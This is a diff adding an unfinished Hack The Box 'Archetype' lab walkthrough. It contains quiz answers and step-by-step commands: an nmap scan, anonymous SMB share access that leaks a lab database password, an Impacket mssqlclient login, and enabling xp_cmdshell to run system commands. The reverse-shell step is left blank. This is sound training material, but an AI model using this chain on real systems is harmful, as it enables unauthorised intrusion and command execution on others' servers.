@@ -1,0 +1,116 @@
+Hack The Box
+Machine: Archetype
+Part of the Starting point tier 2 series
+Difficulty: Very Easy
+Google Docs:
+
+Q1: Which TCP port is hosting a database sever?
+A1: 1433
+
+Q2: What is the name of the non administrative share available over SMB
+A2: backups
+
+Q3: What is the password identified in the file on the SMB share?
+A3: M3g4c0rp123
+
+Q4: What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
+A4: mssqlclient.py
+
+Q5: What extended stored procedure of Microsoft SQL Servers can be used in order to spawn a Windows command shell?
+A5: xp_cmdshell
+
+Q6: What script can be used in order to search possible paths to escalate privileges on windows hosts
+A6: WinPeas
+
+Q7: What file contains the administrators password?
+A7: 
+
+
+
+Step1:
+  Run nmap to discover open ports and service versions on them.
+  nmap -sV -vv <target_IP>
+  
+  Scan Results:
+    PORT     STATE SERVICE      REASON  VERSION
+  135/tcp  open  msrpc        syn-ack Microsoft Windows RPC
+  139/tcp  open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
+  445/tcp  open  microsoft-ds syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+  1433/tcp open  ms-sql-s     syn-ack Microsoft SQL Server 2017 14.00.1000
+  Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+  
+  This gives us the answer to question 1 which is 1433
+  
+ Step2: 
+    We need to use smbclient to check out the shares available on the target machine.
+    smbclient -N -L <target_IP>
+    
+    Command output:
+      Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backups         Disk      
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        
+    Since we know administrative shares are marked with the $ symbol we see the answer to question 2 is "backups"
+    
+  Step3: 
+      We need to connect to the smb client and access the back upsshares.
+      We will do this with the following command
+      smbclient -N \\\\<target_IP>\\backups
+      
+      We should now have SMB access to the machine. Running the ls command will show there is just one file in the backups directory
+      use get prod.dtsConfig to download the file
+      
+      back in your working diretory cat the file and within the output you will find this line giving us the answer to question 3
+      Password=M3g4c0rp123;User ID=ARCHETYPE
+ 
+  Step4: 
+    You will need to install impacket if you don't have it. 
+    
+    git clone https://github.com/SecureAuthCorp/impacket.git
+    
+    cd impacket
+    
+    sudo python3 setup.py install
+    
+    You will need to navigate over to the scripts directory so from the impacket directory cd /build/scripts-3.10/
+    
+    here you can ls to see all of the available scripts but the one we will be working with is mssqlclient.py since we already found an sql_svc user name and password
+    
+    The next command to enter will be
+    python3 mssqlclient.py ARCHETYPE/sql_svc@<target_IP> -windows-auth
+    
+    Enter M3g4c0rp123 as the password when prompted and you will be logged into the machines SQL server.
+    
+  Step5: 
+    If you enter help you will be display with this menu:
+      SQL> help
+
+     lcd {path}                 - changes the current local directory to {path}
+     exit                       - terminates the server process (and this session)
+     enable_xp_cmdshell         - you know what it means
+     disable_xp_cmdshell        - you know what it means
+     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+     ! {cmd}                    - executes a local shell cmd
+     
+   using xp_cmdshell "whoami" generates an error telling us xp_cmdshell has been turned off as a security procedure but that a system administrator can enable it by using sp_configure
+   
+   So let's give it a shot by entering
+   EXEC sp_configure 'xp_cmdshell', 1;
+   We get a message to run the RECONFIGURE statement to install so just type RECONFIGURE; and press enter
+   If you did it right it'll seem like nothing happened but if we now run our test command it should produce output
+   xp_cmdshell "whoami"
+   
+   Step6: 
+    From here we need to set up a reverse shell
+   
+   
+   
+     
+
+    
+
+    
